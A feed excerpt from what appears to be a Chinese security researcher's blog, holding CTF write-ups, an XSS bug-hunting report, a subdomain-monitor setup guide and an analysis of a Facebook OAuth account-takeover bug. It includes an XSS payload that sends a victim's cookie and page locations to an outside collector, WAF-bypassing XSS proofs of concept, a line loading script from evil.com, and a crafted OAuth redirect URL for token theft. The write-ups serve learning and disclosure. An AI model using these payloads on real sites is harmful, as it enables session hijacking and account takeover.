src="http://static.zybuluo.com/1160307775/lpus3euv91f6ktmyow8un530/image_1d7rm3mr9ffe1d2gqr93lp1obcu.png" alt="image_1d7rm3mr9ffe1d2gqr93lp1obcu.png-57kB"></p><p>编码转换的exp如下</p><pre><code># Author:Hpdoger@d0g3html_old = &quot;javascript:var website=&#39;http://xssye/index.php&#39;;(function(){(new Image()).src=website+&#39;/?keepsession=1&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;buffer = &quot;&quot;for zimu in html_old:    zimu = ord(zimu)    zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu)    # print(&quot;&amp;#&quot;+zimu)    buffer = buffer + zimuprint(buffer)</code></pre><h1 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h1><p>这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容</p><p>看到有个提示，base64解码之后是，dir.php<br><img src="http://static.zybuluo.com/1160307775/sn4yzp6jhu22951ixfda9wz9/image_1d7rmb67sieflmcrj41nmodcsdb.png" alt="image_1d7rmb67sieflmcrj41nmodcsdb.png-66.1kB"></p><p>请求dir.php，同时fuzz参数，有个dir(其实略脑洞，我只尝试了file、dir、path就出来了。。<br><img src="http://static.zybuluo.com/1160307775/dqvga0mdv6ohks1ymtth4rbe/image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png" alt="image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png-212.3kB"></p><p>看到根目录存在ffxxx的文件，直接用file去读<br><img src="http://static.zybuluo.com/1160307775/8qtcm0dqetiop2w9ccw2tr8k/image_1d7rmhg0ls1l3ptm8k29n614e5.png" alt="image_1d7rmhg0ls1l3ptm8k29n614e5.png-27.7kB"></p><h1 id="MISC3-TTL隐写"><a href="#MISC3-TTL隐写" class="headerlink" title="MISC3 TTL隐写"></a>MISC3 TTL隐写</h1><p>给了个本文，里面是很多TTL值。hint说隐藏了信息。<br><img src="http://static.zybuluo.com/1160307775/m9tv96888aiofm7wv51e4bp3/image_1d7ttpfr51j1m1jks1rd3bafkqjp.png" alt="image_1d7ttpfr51j1m1jks1rd3bafkqjp.png-31.8kB"></p><p>在网上找了一下，发现在MISC中有一项技术叫TTL隐写。</p><p>大致的隐写流程如下：<br>将TTL的值转为8位二进制，高位补0，取头两位的二进制。这样4个TTL的值就能取够一个8位的二进制数，再将这个8位的二进制转换为字符(因为一个字符=一个字节=8位二进制)。</p><p>这就是成功将字符隐写在TTL值中，所以只需要逆出来取8位还原成字符就行，写了个提取脚本</p><pre><code>#! /usr/bin/python3# Author: Hpdoger@d0g3count = 0change_list = []word_list = &#39;&#39;zimus = &#39;&#39;with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file:    for ttl in file.readlines():        change_list.append(ttl.replace(&#39;TTL=&#39;,&#39;&#39;))        if len(change_list) == 4:            for num in change_list:                num = int(num)                a = bin(num).replace(&#39;0b&#39;,&#39;&#39;)                b = str(&quot;%08d&quot; % int(a))                infront = b[0:2]                word_list = word_list + infront            zimu = int(word_list,2)            zimus = zimus+chr(zimu)            word_list = &#39;&#39;            change_list.clear()            count = 0with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:    file2.write(zimus)</code></pre><p>转换出来的结果如下<br><img src="http://static.zybuluo.com/1160307775/0ulidat6fp1h55b84nrtusak/image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png" alt="image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png-147.1kB"></p><p>一看就是16进制，开头ffd8ff是图片头，拖到winhex里还原成图片就行了，最后还原出来4个二维码。</p><p>拼接扫描得到:</p><pre><code>key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}</code></pre><p>维吉尼亚密码解密，得到<br>flag{2028ab39927df1d96e6a12b03j58002v}<br>再进行一次字母转换<br>e-&gt;j,e-&gt;v<br>flag{2028ab39927df1d96e6a12b03e58002e}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;西湖论剑2019-Writeup&quot;&gt;&lt;a href=&quot;#西湖论剑2019-Writeup&quot; class=&quot;headerlink&quot; title=&quot;西湖论剑2019-Writeup&quot;&gt;&lt;/a&gt;西湖论剑2019-Writeup&lt;/h1&gt;&lt;p&gt;Author:Hpdoger
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SRC挖掘初探之随缘XSS挖掘</title>
    <link href="https://hpdoger.cn/2019/04/05/SRC%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2%E4%B9%8B%E9%9A%8F%E7%BC%98XSS%E6%8C%96%E6%8E%98/"/>
    <id>https://hpdoger.cn/2019/04/05/SRC挖掘初探之随缘XSS挖掘/</id>
    <published>2019-04-04T16:00:00.000Z</published>
    <updated>2019-04-05T10:07:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文首发于先知社区：<a href="https://xz.aliyun.com/t/4625" target="_blank" rel="noopener">https://xz.aliyun.com/t/4625</a></p><p>Author:Hpdoger@D0g3</p><p>最近试着去学挖洞，在测某SRC的一些业务时发现以下几个XSS的点。对于一些请求参数在返回的html中以隐蔽的标签形式出现的XSS，感觉还是挺常见的。这里我写了个Bp的插件用来监听请求并捕获这种情况:<a href="https://github.com/Hpd0ger/SuperTags" target="_blank" rel="noopener">SuperTags</a></p><p>下面的案例和讨论如果有什么片面或错误的地方，还望师傅们斧正</p><h1 id="登陆跳转处XSS"><a href="#登陆跳转处XSS" class="headerlink" title="登陆跳转处XSS"></a>登陆跳转处XSS</h1><p>某处登陆页面看了眼表单，同时跟进事件绑定的对象utils<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093334-a9875eec-5679-1.png" alt="image_1d6vk2rs4g541hq8olo1sf275i1g.png-83kB"></p><p>直接截出登陆验证部分，redata是响应参数，登陆成功为0。host定义为<strong>normal.com</strong>。这里发现其实在登陆的时候是可以存在一个cb参数的(但之前我登陆的时候并没有察觉，因为是后台有个功能loginout，点击才会附带cb参数到登录页)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac41e300-5679-1.png" alt></p><p>其中,getparam方法如下</p><pre><code>getParam: function(c_name) {    var urlParams = location.href;    var c_start = urlParams.indexOf(c_name + &quot;=&quot;);銆€    if (c_start != -1) {        c_start = c_start + c_name.length + 1;銆€        c_end = urlParams.indexOf(&quot;&amp;&quot;, c_start);        if (c_end == -1) {            c_end = urlParams.length;        }        return urlParams.substring(c_start, c_end);    }else{        return null;    }},</code></pre><p>这里开发者还是对cb参数进行了意识形态的过滤，如果cb不包含host则强制重定向首页。但是略鸡肋，直接把host放在注释符后就能绕过。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac53408c-5679-1.png" alt="image_1d6vkg95e1vjv155m1s1n1c7oook3d.png-54.2kB"></p><p>POC：</p><pre><code>cb=javascript:alert(document.cookie);//normal.com</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac649418-5679-1.png" alt="image_1d6vko6a51n64961h1pcd370647.png-127.7kB"></p><h1 id="Image处的XSS"><a href="#Image处的XSS" class="headerlink" title="Image处的XSS"></a>Image处的XSS</h1><p>这是该厂商的一个移动端业务，在我测之前已经有表哥X进去了，看一下这个洞是如何产生的。</p><p>功能点:提交问题反馈，可以上传问题图片<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac846cde-5679-1.png" alt="image_1d6vivcc51p0mpm5hb61kgqti29.png-76.5kB"></p><p>漏洞逻辑：<br>上传图片-&gt;提交反馈-&gt;服务端拼接提交的img参数(uri)为img标签src属性的完整地址</p><p>测试上传一个图片后，点击提交反馈并抓包，<code>imglist</code>参数是刚才上传图片返回的uri地址。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-aca2a2bc-5679-1.png" alt="image_1d6vj4nch1a5p118b18ci1gu31olam.png-235.9kB"></p><pre><code>POST xxxx?q=index/feedback HTTP/1.1imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;</code></pre><p>问题就出在拼接标签这部分，修改imglist参数就可以闭合Src属性进行xss,使最终的img标签执行onerror事件</p><p>步骤：抓包修改img路径-&gt;拼接恶意js事件，POC：</p><pre><code>imglist=urlencode(&quot; onerror=&quot;alert(`XSS�`)&quot;&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acc0b540-5679-1.png" alt></p><p>成功弹窗<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-accf7fa8-5679-1.png" alt="image_1d6vjv0dfkis172e1mkpd9b78c13.png-78kB"></p><h1 id="邮件提交处的XSS"><a href="#邮件提交处的XSS" class="headerlink" title="邮件提交处的XSS"></a>邮件提交处的XSS</h1><p>在测试某业务的邮箱密码验证时，发现一个包含请求邮箱的页面。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acea5b84-5679-1.png" alt="image_1d6vf99vp1smijbq1q9pa1s1sfh2d.png-297.8kB"></p><p>记得之前看过一篇文章，有些服务在发送完邮件后会弹出一个“邮件已发送+email”的页面导致反射型XSS，感觉就是这种了。</p><p>随手测试了一下，发现直接waf了空格、双引号、尖括号，和”&quot;。实体了html编码的尖括号，但是没有实体html编码的双引号。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad08fdbe-5679-1.png" alt="image_1d6vf627h11u1ru6slc13uu1qqt1j.png-337.5kB"></p><p>同时在FUZZ的期间多次出现参数错误的请求，发现可能是应用层做了些过滤：</p><ol><li>email字符串长度&lt;40且@结尾</li><li>不能同时出现两个双引号、括号</li><li>正则alert(1)\prompt(1)\confim…</li></ol><p>不过只要脱离引号就好说，毕竟有很多JS事件可以调。一开始把眼光放在了input标签上测试了一些on事件，发现type是hidden，一些可视on事件都没用的。记得之前看过一个input hidden xss的一个用法是按alt+shift+x触发，poc如下</p><pre><code>urlencode(email=&amp;#34/accesskey=&amp;#34X&amp;#34/onclick=&amp;#34alert&amp;#40&#39;xss&#39;&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad17de9c-5679-1.png" alt="image_1d6vfebe9k0q1704vhff8u16cq2q.png-39kB"></p><p>但是这个poc很鸡肋。因为要打出cookie的话长度受限，且利用条件苛刻(firefox+按键)</p><p>回头看了下发现有form标签也有输出点，最初以为form能执行的JS事件就只有reset和submit，后来测试跑onmounseover也能弹框。</p><pre><code>encodeurl(email=&amp;#34/onmouseover=&amp;#34alert&amp;#40document.cookie&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad29e16e-5679-1.png" alt="image_1d71n2s5m1mnpvbslfj1iatkg99e.png-70.9kB"></p><h1 id="一个受阻的XSS"><a href="#一个受阻的XSS" class="headerlink" title="一个受阻的XSS"></a>一个受阻的XSS</h1><p>在测试某业务时发现一个有趣的参数拼接点：</p><p>iframe的src拼接url参数+后端给定的第三方host-&gt;iframe加载src</p><p>测试了一下特殊字符都给实体化了，但是又舍不得一个iframe<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad3e1f30-5679-1.png" alt="image_1d6vl16bn14i9ihun3ovnvnd4k.png-187.5kB"></p><p>经过一番寻找，发现第三方服务的登陆点存在JS跳转漏洞，用iframe加载这个第三方服务的dom-xss也能造成弹框效果<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad523f1a-5679-1.png" alt="image_1d6vleeqr1r4613u81e81cja1m3h5h.png-106.4kB"></p><p>虽然是在SRC业务站点弹的框，但真正的域应该是子页面的。打印一下COOKIE验证，果然是子页面域的cookie。由于waf掉了document.cookie和javascript:alert，我用了html编码的’:’和八进制js编码的’.’绕过，完整打印子页面域payload如下</p><pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(document\56cookie)</code></pre><p>在进一步的探索中，我做了两个尝试：</p><ol><li>尝试跳一个外域的JS，看能不能把src属性转到这个js<pre><code>https://src.com?url=redirect_uri%3Dhttps://evil.com/xss.js</code></pre>但是会把资源解析到子页面的document里，而不是src的改变<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad63994a-5679-1.png" alt="image_1d6vm2dvb1ls2185k1hof58miho5u.png-128.4kB"></li></ol><ol start="2"><li>iframe是否能调用父页面的事件呢(document)？如果可以的话我们就直接调js uri把cookie打出去。之所以有这个想法是因为，当时寻思既然站点调用这个三方服务了，很大可能性这个三方站是iframe-src白名单。不过测试后发现依然被跨域限制，测试payload<pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(window.parent.document\56cookie)</code></pre><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad6accec-5679-1.png" alt="image_1d6fi5odbg1pnb7nfdgs7ji6p.png-13.7kB"></li></ol><p>对跨域姿势了解的不多，如果有兴趣的师傅，可以一起来交流一下这种问题</p><h1 id="自闭总结"><a href="#自闭总结" class="headerlink" title="自闭总结"></a>自闭总结</h1><p>从打ctf到学着去挖洞，还是有一些思维出入的地方，慢慢理解之前师傅们说的资产收集的重要性。</p><p>也特别感谢引路人鬼麦子师傅给予的帮助，这里顺便推荐麦子师傅基于爬虫的一款开源子域名监控工具<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">get_domain</a>，在搭建过程中如果遇到环境配置问题，可以参考这篇<a href="http://hpdoger.me/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/" target="_blank" rel="noopener">Ubuntu16.04-Get_domain搭建手册</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/4625&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4625&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Author:Hpdoger@D0
      
    
    </summary>
    
    
      <category term="论坛文章" scheme="https://hpdoger.cn/tags/%E8%AE%BA%E5%9D%9B%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04-子域名监控工具Getdomain环境搭建</title>
    <link href="https://hpdoger.cn/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/"/>
    <id>https://hpdoger.cn/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/</id>
    <published>2019-03-29T16:00:00.000Z</published>
    <updated>2019-03-31T02:17:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ubuntu16-04-子域名监控Get-domain环境搭建"><a href="#Ubuntu16-04-子域名监控Get-domain环境搭建" class="headerlink" title="Ubuntu16.04-子域名监控Get_domain环境搭建"></a>Ubuntu16.04-子域名监控Get_domain环境搭建</h1><p>操作环境：Ubuntu16.04<br>数据库：Mongdb<br>项目地址：<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">https://github.com/guimaizi/get_domain</a></p><h1 id="各种依赖安装"><a href="#各种依赖安装" class="headerlink" title="各种依赖安装"></a>各种依赖安装</h1><pre><code>sudo apt-get install git python3 python3-pip xvfb unzip libxss1 libappindicator1 libindicator7 -ysudo pip3 install selenium pymongo</code></pre><h1 id="安装mongodb服务端"><a href="#安装mongodb服务端" class="headerlink" title="安装mongodb服务端"></a>安装mongodb服务端</h1><ol><li>添加mongodb签名到APT<pre><code>sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927</code></pre></li><li>创建/etc/apt/sources.list.d/mongodb-org-3.2.list文件并写入命令<pre><code>echo &quot;deb http://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.2 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.2.list</code></pre></li><li>更新软件源列表<pre><code>sudo apt-get update</code></pre></li><li>安装mongodb（默认是安装稳定版）<pre><code>sudo apt-get install -y mongodb-org</code></pre></li></ol><h1 id="配置mongodb服务端"><a href="#配置mongodb服务端" class="headerlink" title="配置mongodb服务端"></a>配置mongodb服务端</h1><ol><li><p>修改配置文件<code>/etc/mongodb.conf</code></p><pre><code>修改后的内容如下：bind_ip = 0.0.0.0port = 27017auth=true (添加帐号,密码认证)</code></pre><p>修改后重启mongodb:sudo service mongodb restart</p></li><li><p>添加超级用户</p><pre><code>use admindb.createUser({user:&#39;admin&#39;,pwd:&#39;123456aaa1xsda1A&#39;,roles:[{role:&#39;userAdminAnyDatabase&#39;,db:&#39;admin&#39;}]})db.auth(&#39;admin&#39;,&#39;123456aaa1xsda1A&#39;)</code></pre></li><li><p>添加扫描器用户</p><pre><code>use target_domaindb.createUser({user:&#39;target&#39;,pwd:&#39;123456aaaxsda1A&#39;,roles:[{role:&#39;readWrite&#39;,db:&#39;target_domain&#39;}]})db.auth(&#39;target&#39;,&#39;123456aaaxsda1A&#39;)</code></pre></li></ol><h1 id="安装chromedriver"><a href="#安装chromedriver" class="headerlink" title="安装chromedriver"></a>安装chromedriver</h1><p>先安装Chrome浏览器</p><pre><code>sudo apt-get install libxss1 libappindicator1 libindicator7wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.debsudo dpkg -i google-chrome*.debsudo apt-get install -f</code></pre><p>再安装chromedriver</p><pre><code>wget -N http://chromedriver.storage.googleapis.com/72.0.3626.7/chromedriver_linux64.zipunzip chromedriver_linux64.zipchmod +x chromedriversudo mv -f chromedriver /usr/local/share/chromedriversudo ln -s /usr/local/share/chromedriver /usr/local/bin/chromedriversudo ln -s /usr/local/share/chromedriver /usr/bin/chromedriver</code></pre><h1 id="安装go-lang"><a href="#安装go-lang" class="headerlink" title="安装go-lang"></a>安装go-lang</h1><pre><code>$ sudo apt-get update$ sudo apt-get -y upgrade$ wget https://storage.googleapis.com/golang/go1.7.linux-amd64.tar.gz$ sudo tar -xvf go1.7.linux-amd64.tar.gz$ sudo mv go /usr/local</code></pre><p>设置gopath</p><pre><code>vim /etc/profileexport GOROOT=/usr/local/go  #设置为go安装的路径，有些安装包会自动设置默认的gorootexport GOPATH=$HOME/gocode   #默认安装包的路径export PATH=$PATH:$GOROOT/bin:$GOPATH/binsource /etc/profile</code></pre><p>go env看一下是否设置成功</p><h1 id="设置Python默认为Python3"><a href="#设置Python默认为Python3" class="headerlink" title="设置Python默认为Python3"></a>设置Python默认为Python3</h1><p>文章：<a href="https://blog.csdn.net/u011534057/article/details/51615193" target="_blank" rel="noopener">https://blog.csdn.net/u011534057/article/details/51615193</a></p><p>使用文章的第二种方法：在系统级修改 Python 版本</p><h1 id="下载subfinder"><a href="#下载subfinder" class="headerlink" title="下载subfinder"></a>下载subfinder</h1><pre><code>go get github.com/subfinder/subfinder</code></pre><p>报错没关系，只要文件里有bin src就行</p><h1 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h1><p>见<a href="http://www.guimaizi.com/archives/360的启动说明" target="_blank" rel="noopener">http://www.guimaizi.com/archives/360的启动说明</a></p><p>crontab定时执行任务：<a href="https://www.jianshu.com/p/838db0269fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/838db0269fd0</a></p><p>crontab文件如下，每天12点执行：</p><pre><code># everday 12:00 am exec0 0 17 * * ? python /home/get_domain/while_update.py</code></pre><p>注意最后要留个空行</p><h1 id="Mongodb操作"><a href="#Mongodb操作" class="headerlink" title="Mongodb操作"></a>Mongodb操作</h1><p>更新，否则无法进行对比，更新状态到0</p><pre><code>db.getCollection(&#39;xxx&#39;).update({&#39;state&#39;:1},{$set:{&#39;state&#39;: NumberInt(0)}},{multi:true})</code></pre><h1 id="一直运行random-start"><a href="#一直运行random-start" class="headerlink" title="一直运行random_start"></a>一直运行random_start</h1><pre><code>nohup python -u random_start.py &gt; nohup.log 2&gt;&amp;1 &amp;</code></pre><p>记得修改random_start的代码为while 1<br>可以修改五次config,运行五个后台程序</p><h1 id="各种报错解决"><a href="#各种报错解决" class="headerlink" title="各种报错解决"></a>各种报错解决</h1><h2 id="报错代码127"><a href="#报错代码127" class="headerlink" title="报错代码127"></a>报错代码127</h2><pre><code>selenium.common.exceptions.WebDriverException: Message: Service chromedriver unexpectedly exited. Status code was: 127</code></pre><p>原因是browser版本过低，跟driver不匹配，升级browser</p><pre><code>apt-get install chromium-browser</code></pre><h2 id="权限报错"><a href="#权限报错" class="headerlink" title="权限报错"></a>权限报错</h2><pre><code>selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormall</code></pre><p>chromedriver在py程序里没权限，修改代码Browser.py</p><pre><code>chrome_options.add_argument(&#39;--headless&#39;)chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>安装mongodb:<a href="https://www.jianshu.com/p/5598f1dcbb98" target="_blank" rel="noopener">https://www.jianshu.com/p/5598f1dcbb98</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ubuntu16-04-子域名监控Get-domain环境搭建&quot;&gt;&lt;a href=&quot;#Ubuntu16-04-子域名监控Get-domain环境搭建&quot; class=&quot;headerlink&quot; title=&quot;Ubuntu16.04-子域名监控Get_domain环境搭
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>0CTF2019-Web1WriteUp</title>
    <link href="https://hpdoger.cn/2019/03/25/0CTF2019-Web1WriteUp/"/>
    <id>https://hpdoger.cn/2019/03/25/0CTF2019-Web1WriteUp/</id>
    <published>2019-03-24T16:00:00.000Z</published>
    <updated>2019-03-25T15:02:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0CTF-Web1"><a href="#0CTF-Web1" class="headerlink" title="0CTF Web1"></a>0CTF Web1</h1><p>第一次打0ctf，长见识了，各路神仙满天飞..</p><p>题目地址：<a href="http://111.186.63.207:31337" target="_blank" rel="noopener">http://111.186.63.207:31337</a></p><p>需要一个karaf认证，直接双写karaf<br><img src="http://static.zybuluo.com/1160307775/jjadmv0j4cbreq70dc6l9esd/image_1d6nu1vae155hklkc5e15c41ak99.png" alt="image_1d6nu1vae155hklkc5e15c41ak99.png-15.3kB"></p><p>当时组内师傅说有jolokia<br><img src="http://static.zybuluo.com/1160307775/vbmi61p7x4a5qmtsrsqodszt/image_1d6nu81co9hr1ac74nk2rs1n3um.png" alt="image_1d6nu81co9hr1ac74nk2rs1n3um.png-49.8kB"></p><p>去搜了一下jolokia的洞，看到了Lucifaer师傅的两篇分析文章<br><a href="https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/#0x05-poc%E6%9E%84%E9%80%A0" target="_blank" rel="noopener">https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/#0x05-poc%E6%9E%84%E9%80%A0</a></p><p><a href="https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc" target="_blank" rel="noopener">https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc</a></p><p>大致意思就是，执行器可以调用jolokia的list里类的函数来执行一些操作。可是搜了一下List没有logback可以用，但是题目里很明显提示有karaf，那么是否可以通过控制器的poc安装一个karaf控制台呢？所有karaf的时候有下面这个op</p><p><img src="http://static.zybuluo.com/1160307775/j1j2pt3lm0j8jtr9b63ehk7p/image_1d6qgq8tn1qaa1hhlbr2nl413s11m.png" alt="image_1d6qgq8tn1qaa1hhlbr2nl413s11m.png-7.2kB"></p><p><img src="http://static.zybuluo.com/1160307775/m7j4c61sux7w6ovgpox6e8ol/image_1d6qgok3kjq716kir4b1k1v6as9.png" alt="image_1d6qgok3kjq716kir4b1k1v6as9.png-12kB"></p><p>最终POC，利用luciafaer师傅的post数据包改造，mbean+op+args</p><p>注意content-type:applicatio/json，bp直接发包太坑了</p><p><img src="http://static.zybuluo.com/1160307775/nwnjcjdnn91n2qa6dpk35rvn/image_1d6num88ikml1pqe1jid1sln1kuh13.png" alt="image_1d6num88ikml1pqe1jid1sln1kuh13.png-111.6kB"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0CTF-Web1&quot;&gt;&lt;a href=&quot;#0CTF-Web1&quot; class=&quot;headerlink&quot; title=&quot;0CTF Web1&quot;&gt;&lt;/a&gt;0CTF Web1&lt;/h1&gt;&lt;p&gt;第一次打0ctf，长见识了，各路神仙满天飞..&lt;/p&gt;
&lt;p&gt;题目地址：&lt;a hre
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>对“绕过Facebook Token进行CSRF账号接管”的文章解读</title>
    <link href="https://hpdoger.cn/2019/02/18/%E6%B5%85%E8%B0%88%E7%BB%95%E8%BF%87Facebook%20Token%E8%BF%9B%E8%A1%8CCSRF%E8%B4%A6%E5%8F%B7%E6%8E%A5%E7%AE%A1/"/>
    <id>https://hpdoger.cn/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/</id>
    <published>2019-02-17T16:00:00.000Z</published>
    <updated>2019-02-19T15:22:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅谈绕过Facebook-Token进行CSRF账号接管"><a href="#浅谈绕过Facebook-Token进行CSRF账号接管" class="headerlink" title="浅谈绕过Facebook Token进行CSRF账号接管"></a>浅谈绕过Facebook Token进行CSRF账号接管</h1><p>今天早上看到Sam大佬推特发了这篇文章，下午就见到先知上有译文了。为什么有译文了还要写这篇文章呢？安全圈的译文你懂的，大部分右键一把梭。</p><p>从文章本身来说，还是有比较值得学习的地方，所以摘出来流程分析一下。</p><p>原文：<a href="https://ysamm.com/?p=185" target="_blank" rel="noopener">https://ysamm.com/?p=185</a></p><p>先知译文: <a href="https://xz.aliyun.com/t/4089#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/4089#toc-5</a></p><h1 id="漏洞关键条件"><a href="#漏洞关键条件" class="headerlink" title="漏洞关键条件"></a>漏洞关键条件</h1><p>攻击者有一个oauth认证接口，即漏洞网站可以授权自己的网站</p><h1 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h1><p><img src="https://i.loli.net/2019/02/19/5c6c1ace4e4e3.jpg" alt></p><p>第二步，即location的Url如下</p><pre><code>https://www.facebook.com/comet/dialog_DONOTUSE/?url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code></pre><p>next参数为<strong>下一步跳转参数</strong>，即邮箱绑定后跳转到<code>/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code>获取token再redirect到attacker web</p><h1 id="总结-修复思考"><a href="#总结-修复思考" class="headerlink" title="总结/修复思考"></a>总结/修复思考</h1><p>漏洞新颖的点就在授权后的跳转，这也算是一种突破oauth的新思路。利用信任站点的重定向进行其它oauth的绑定，再携带token二次重定向到attacker web。</p><p>如果能再二次重定向的地方加一个权限验证，即attacker app与oauth匹配，会不会避免这样的越权呢？</p><p>其次就是，如果我们省略三方授权，直接诱导用户点击第二步的location，不就更省事了么？这点我邮寄了sam师傅，希望日后有其它研究的师傅可以指点一下~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;浅谈绕过Facebook-Token进行CSRF账号接管&quot;&gt;&lt;a href=&quot;#浅谈绕过Facebook-Token进行CSRF账号接管&quot; class=&quot;headerlink&quot; title=&quot;浅谈绕过Facebook Token进行CSRF账号接管&quot;&gt;&lt;/a&gt;浅谈
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Oauth2的两类漏洞挖掘</title>
    <link href="https://hpdoger.cn/2019/02/14/Oauth2%E7%9A%84%E4%B8%A4%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>https://hpdoger.cn/2019/02/14/Oauth2的两类漏洞挖掘/</id>
    <published>2019-02-13T16:00:00.000Z</published>
    <updated>2019-02-14T02:52:02.000Z</updated>
    
